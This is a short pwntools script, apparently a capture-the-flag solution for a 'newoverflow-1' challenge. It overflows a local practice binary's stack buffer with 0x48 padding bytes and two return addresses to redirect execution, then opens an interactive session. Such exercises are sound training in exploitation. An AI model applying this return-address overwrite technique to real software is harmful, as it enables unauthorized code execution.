from pwn import *

sock = process("/problems/newoverflow-1_5_fbc0b66e9df387af7c04c6ff17ac8058/vuln", cwd="/problems/newoverflow-1_5_fbc0b66e9df387af7c04c6ff17ac8058")
#sock = process("./vuln")

payload = 'A' * 0x48
payload += p64(0x4007cb)
payload += p64(0x0000000000400767)
sock.sendline(payload)

sock.interactive()
